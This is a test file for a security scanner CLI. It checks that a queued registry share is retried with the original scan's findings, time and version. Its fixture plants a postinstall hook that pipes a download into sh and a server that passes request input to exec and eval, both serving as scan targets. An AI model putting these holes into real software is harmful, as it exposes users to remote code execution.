/**
 * A registry share that `check` could not send is sent again on a later run
 * with what the first attempt sent: the scan's findings, its scan time and
 * the version that scanned it.
 *
 * Before this, the queue in `$OPENA2A_HOME/hma-pending-scans.json` held a
 * finding count, and the retry sent an empty findings list stamped with the
 * time of the retry and the version doing it. The registry reads an empty
 * list as a scan with no findings, so a failing scan shared on a retry was
 * recorded as clean. An entry an earlier version queued in that form is now
 * dropped with a one-line notice and not sent.
 *
 * Hermetic, as in check-url-userinfo-not-published.test.ts: `git` is a shim
 * on PATH that copies a local fixture tree; the registry is a capture server
 * on localhost, in a child process because `spawnSync` blocks this worker's
 * event loop, that records every request and answers a publish with the
 * status the test writes to a file (503, then 200) and anything else with
 * 503; contribution is switched on in a scratch OPENA2A_HOME; and
 * __tests__/helpers/loopback-only.cjs, preloaded through NODE_OPTIONS,
 * refuses a connection to any host but loopback.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { spawn, spawnSync, type ChildProcess } from 'node:child_process';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { assertDistFresh, BUILT_CLI as CLI } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';

beforeAll(assertDistFresh);

const TTY_PRELOAD = path.join(__dirname, '..', 'fixtures', 'stdin-tty-preload.cjs');
const LOOPBACK_ONLY = path.join(__dirname, '..', 'helpers', 'loopback-only.cjs');

const FAILING_REPO = 'gitlab.com/example-org/failing-repo';
const OTHER_REPO = 'gitlab.com/example-org/other-repo';
const EARLIER_VERSION_REPO = 'gitlab.com/example-org/earlier-version-repo';
const QUEUED_REPO = 'gitlab.com/example-org/queued-repo';

const GIT_SHIM = `#!/bin/sh
# Stands in for git: \`git clone ... <url> <dest>\` copies the fixture tree to
# <dest>. Any other git command fails.
if [ "$1" = "clone" ]; then
  for dest in "$@"; do last="$dest"; done
  mkdir -p "$last" && cp -R "$HMA_TEST_CLONE_SOURCE/." "$last/"
  exit $?
fi
exit 1
`;

const SERVER_SRC = `
const http = require('node:http');
const fs = require('node:fs');
const [capture, statusFile] = process.argv.slice(2);
const server = http.createServer((req, res) => {
  let body = '';
  req.setEncoding('utf8');
  req.on('data', (chunk) => { body += chunk; });
  req.on('end', () => {
    fs.appendFileSync(capture, JSON.stringify({ method: req.method, url: req.url, body }) + '\\n');
    const publish = req.method === 'POST' && req.url === '/api/v1/trust/publish';
    res.statusCode = publish ? Number(fs.readFileSync(statusFile, 'utf8')) : 503;
    res.setHeader('content-type', 'application/json');
    res.end(res.statusCode === 200 ? '{"accepted":true}' : '{"error":"unavailable"}');
  });
});
server.listen(0, 'localhost', () => {
  process.stdout.write(String(server.address().port) + '\\n');
});
`;

interface ScanFinding { checkId: string; severity: string; passed: boolean }
interface Submission {
  name: string;
  score: number;
  toolVersion: string;
  scanTimestamp: string;
  verdict?: string;
  findings: ScanFinding[];
}
interface Run { status: number | null; stderr: string; queue: unknown[] | null; publishes: Submission[] }

let scratch = '';
let source = '';
let binDir = '';
let capturePath = '';
let statusPath = '';
let base = '';
let serverProc: ChildProcess | undefined;
let failedRun: Run;
let retryRun: Run;
let mixedQueueRun: Run;

function publishes(): Submission[] {
  const raw = fs.existsSync(capturePath) ? fs.readFileSync(capturePath, 'utf8') : '';
  return raw
    .split('\n')
    .filter(Boolean)
    .map((line) => JSON.parse(line) as { method: string; url: string; body: string })
    .filter((q) => q.method === 'POST' && q.url === '/api/v1/trust/publish')
    .map((q) => JSON.parse(q.body) as Submission);
}

/** Runs `check https://<repo>.git` with OPENA2A_HOME `<scratch>/<profile>`, the registry answering a publish with `publishStatus`. */
function run(profile: string, repo: string, publishStatus: 200 | 503, queueSeed?: unknown[]): Run {
  const home = path.join(scratch, profile, 'home');
  const opena2aHome = path.join(scratch, profile, 'opena2a');
  const queuePath = path.join(opena2aHome, 'hma-pending-scans.json');
  fs.mkdirSync(home, { recursive: true });
  fs.mkdirSync(opena2aHome, { recursive: true });
  fs.writeFileSync(path.join(opena2aHome, 'config.json'), JSON.stringify({ contribute: { enabled: true } }) + '\n');
  if (queueSeed) fs.writeFileSync(queuePath, JSON.stringify(queueSeed, null, 2));
  fs.writeFileSync(statusPath, String(publishStatus));

  // Runs are sequential and the CLI has exited, its requests answered, by the
  // time spawnSync returns, so the publishes after `before` are this run's.
  const before = publishes().length;
  const env: NodeJS.ProcessEnv = { ...process.env };
  delete env.ANTHROPIC_API_KEY; // no hosted analysis: the run stays local
  for (const name of ['HTTPS_PROXY', 'https_proxy', 'HTTP_PROXY', 'http_proxy', 'ALL_PROXY', 'all_proxy', 'NODE_USE_ENV_PROXY']) {
    delete env[name];
  }
  const r = spawnSync(process.execPath, ['--require', TTY_PRELOAD, CLI, 'check', `https://${repo}.git`], {
    encoding: 'utf8',
    timeout: 120_000,
    maxBuffer: 64 * 1024 * 1024,
    env: {
      ...env,
      NO_COLOR: '1',
      OPENA2A_TELEMETRY: 'off',
      HOME: home,
      OPENA2A_HOME: opena2aHome,
      REGISTRY_URL: base,
      PATH: `${binDir}${path.delimiter}${process.env.PATH ?? ''}`,
      HMA_TEST_CLONE_SOURCE: source,
      NODE_OPTIONS: [env.NODE_OPTIONS, `--require "${LOOPBACK_ONLY}"`].filter(Boolean).join(' '),
    },
  });
  return {
    status: r.status,
    stderr: r.stderr ?? '',
    queue: fs.existsSync(queuePath) ? (JSON.parse(fs.readFileSync(queuePath, 'utf8')) as unknown[]) : null,
    publishes: publishes().slice(before),
  };
}

const failing = (s: Submission): ScanFinding[] => s.findings.filter((f) => !f.passed);

function only(r: Run, name: string): Submission {
  const sent = r.publishes.filter((p) => p.name === name);
  expect(sent.map((p) => p.name), r.stderr).toEqual([name]);
  return sent[0];
}

beforeAll(async () => {
  scratch = tempDir('hma-pending-retry-');
  source = path.join(scratch, 'source');
  binDir = path.join(scratch, 'bin');
  capturePath = path.join(scratch, 'capture.jsonl');
  statusPath = path.join(scratch, 'publish-status.txt');
  fs.mkdirSync(source, { recursive: true });
  fs.mkdirSync(binDir, { recursive: true });
  // A package whose install script pipes a download into a shell, and whose
  // server runs a request parameter as a command.
  fs.writeFileSync(path.join(source, 'package.json'), JSON.stringify({
    name: 'failing-repo',
    version: '1.0.0',
    scripts: { postinstall: 'curl -s http://example.invalid/setup.sh | sh' },
  }, null, 2) + '\n');
  fs.writeFileSync(path.join(source, 'server.js'), [
    "const { exec } = require('child_process');",
    "const http = require('http');",
    'http.createServer((req, res) => {',
    "  const cmd = new URL(req.url, 'http://x').searchParams.get('cmd');",
    '  exec(cmd, (err, out) => res.end(out));',
    '  eval(req.headers["x-script"]);',
    '}).listen(0);',
    '',
  ].join('\n'));
  fs.writeFileSync(path.join(binDir, 'git'), GIT_SHIM, { mode: 0o755 });

  const serverFile = path.join(scratch, 'server.js');
  fs.writeFileSync(serverFile, SERVER_SRC);
  fs.writeFileSync(statusPath, '503');
  serverProc = spawn(process.execPath, [serverFile, capturePath, statusPath], { stdio: ['ignore', 'pipe', 'ignore'] });
  const port = await new Promise<string>((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('capture server did not start')), 10_000);
    serverProc!.stdout!.once('data', (d) => { clearTimeout(t); resolve(String(d).trim()); });
    serverProc!.once('exit', () => { clearTimeout(t); reject(new Error('capture server exited')); });
  });
  // `check` accepts a plain-http registry only on localhost.
  base = `http://localhost:${port}`;

  // The registry is down: the share fails and is queued.
  failedRun = run('retry', FAILING_REPO, 503);
  // The registry is back: the next check sends the queued share, then its own.
  retryRun = run('retry', OTHER_REPO, 200);
  // A queue holding an entry an earlier version wrote, which has a finding
  // count and no findings, and an entry in the current form from another
  // version on another day.
  mixedQueueRun = run('mixed', OTHER_REPO, 200, [
    {
      name: EARLIER_VERSION_REPO,
      score: 1,
      maxScore: 100,
      projectType: 'library',
      findingCount: 55,
      timestamp: '2026-10-01T00:00:00.000Z',
    },
    {
      name: QUEUED_REPO,
      score: 40,
      maxScore: 100,
      projectType: 'library',
      toolVersion: '0.0.1-queued',
      scanTimestamp: '2026-10-02T03:04:05.000Z',
      findings: [
        { checkId: 'TEST-QUEUED-001', name: 'queued failing check', severity: 'critical', passed: false, message: 'queued message', category: 'injection' },
        { checkId: 'TEST-QUEUED-002', name: 'queued passing check', severity: 'low', passed: true, message: 'queued message', category: 'injection' },
      ],
    },
  ]);
}, 400_000);

afterAll(() => {
  serverProc?.kill();
});

describe('check sends a queued registry share with what the failed share sent', () => {
  it('the failed share carried failing findings, and the queue holds that submission', () => {
    const original = only(failedRun, FAILING_REPO);
    expect(failing(original).length, failedRun.stderr).toBeGreaterThan(0);
    expect(failing(original).some((f) => f.severity === 'critical' || f.severity === 'high')).toBe(true);

    // The queue entry is the submission, less the constant tool name.
    const { tool: _tool, ...queued } = original as Submission & { tool?: string };
    expect(failedRun.queue).toEqual([queued]);
  });

  it('the retry sends the original findings, verdict, scan time and tool version', () => {
    const original = only(failedRun, FAILING_REPO);
    const retried = only(retryRun, FAILING_REPO);

    expect(retried).toEqual(original);
    expect(failing(retried).length).toBe(failing(original).length);
    expect(retried.findings.length).toBe(original.findings.length);
    // The share sends no verdict field; the registry derives one from the
    // findings, which the retry carries unchanged.
    expect(retried.verdict).toBe(original.verdict);
    expect(retried.scanTimestamp).toBe(original.scanTimestamp);
    expect(retried.toolVersion).toBe(original.toolVersion);
  });

  it('the retry run also sends its own scan, and leaves the queue empty', () => {
    expect(only(retryRun, OTHER_REPO).scanTimestamp).not.toBe(only(failedRun, FAILING_REPO).scanTimestamp);
    expect(retryRun.queue).toEqual([]);
  });

  it('an entry in the current form is sent with its own scan time and tool version', () => {
    const queued = only(mixedQueueRun, QUEUED_REPO);
    expect(queued.scanTimestamp).toBe('2026-10-02T03:04:05.000Z');
    expect(queued.toolVersion).toBe('0.0.1-queued');
    expect(queued.findings.map((f) => [f.checkId, f.passed])).toEqual([['TEST-QUEUED-001', false], ['TEST-QUEUED-002', true]]);
  });

  it('an entry an earlier version queued with no findings is dropped with a notice, not sent', () => {
    expect(mixedQueueRun.publishes.map((p) => p.name).sort()).toEqual([OTHER_REPO, QUEUED_REPO].sort());
    expect(mixedQueueRun.stderr).toContain(
      'Removed 1 queued registry share saved by an earlier version without its findings; not sent. A new check of the same target shares a new scan.',
    );
    expect(mixedQueueRun.queue).toEqual([]);
    // No other run printed it.
    expect(failedRun.stderr + retryRun.stderr).not.toContain('saved by an earlier version');
  });
});
